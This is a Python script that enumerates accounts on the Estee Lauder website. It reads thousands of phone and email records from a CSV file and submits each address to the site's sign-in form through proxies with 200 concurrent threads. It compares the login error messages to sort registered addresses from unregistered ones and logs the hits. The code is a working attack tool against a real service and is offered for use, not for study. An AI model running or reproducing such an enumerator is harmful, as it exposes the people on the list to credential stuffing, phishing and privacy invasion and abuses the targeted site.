from bs4 import BeautifulSoup
import requests 
import gc
import time
import concurrent.futures

from py.config import headers_first,headers_second,proxy,payload,first_url,second_url
from py.csv_handler import csv_handler
from py.logs_handler import logs_handler 


def checker(record):
    global count
    phone = record[0]
    email = record[1]
    ErrorCount = 0
    payloadd = payload
    payloadd["EMAIL_ADDRESS"] = email
    done = False
    while not done:
        try:
            s = requests.Session()
            s.proxies.update(proxy)
            s.headers.update(headers_first)
    
            r = s.get(first_url,timeout=3)

            csrftoken = r.cookies["csrftoken"].replace("%2C",",")
            payloadd["_TOKEN"] = csrftoken
            s.headers.update(headers_second)
            r = s.post(second_url,data = payloadd,timeout = 3)
            response = (BeautifulSoup(r.text,"html.parser").select_one("ul#form--errors--registration").text.replace("\n","").replace("  ","").split("We")[1].split(".")[0])
            if "do not have an account associated with that email address" not in response:
                log.add_records_to_logs(response)
            s.close()
            done = True
            count +=1
            if count%50==0 or count>=ChunkSize:
                log.add_records_to_logs(f"{count} emails checked.")
        except Exception as exc:
            s.close()
            ErrorCount+=1
            if ErrorCount > 5:
                count+=1
                log.add_records_to_logs(exc)
                done = True

#Unregistered - "do not have an account associated with that email address"
#Registered - "We do not recognize your sign in information."

def main(start_from):
    global log
    global count
    global skipped_emails
    global chunk_results

    log = logs_handler("Logs/Esteelauder")
    csv_handler.create("Esteelauder")
    csv_handler.skipped_create()

    records_len = len(csv_handler.read(input_file_name=InputName))
    for number in range(start_from,records_len,ChunkSize):
        #Clearing lists and creating index where to start from
        all_records = []
        skipped_emails = []
        chunk_results = []
        chunk = []
        count = 0

        all_records = csv_handler.read(input_file_name=InputName)
        print("Program started.")
        for x in range(number,number+ChunkSize):
            #Filling chunk with records to process
            try:
                chunk.append(all_records[x])
            except Exception as exc:
                print(exc)
                break
        all_records = [] 

        print(f"Scraping {number}-{number+ChunkSize}.")
        log.add_records_to_logs(f"Scraping {number}-{number+ChunkSize}.")

        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=MaxWorkers) as executor:
            executor.map(checker,chunk)
        end = time.time()

        log.add_records_to_logs(f"Total: {end-start}")

        gc.collect()

        csv_handler.save(records_to_save=chunk_results)
        csv_handler.skipped_save(records=skipped_emails)

        print(f"Chunk completed. {len(skipped_emails)} emails skipped.")
        log.add_records_to_logs(f"Chunk completed. {len(skipped_emails)} emails skipped.")


MaxWorkers = 200
ChunkSize = 5000
InputName = "november_filtered"

main(0)


#TODO
#Add saving system(skipped emails included)
#Change logs(count isn't printed in terminal and errors are spamming inside of the logs)
#Maybe timeout should be 5 or 8? Check with 10 again on small sample and compare with 3 and then decide, I guess
#Increase allowed amount of errors. Maybe 10?
#Run a test with File1
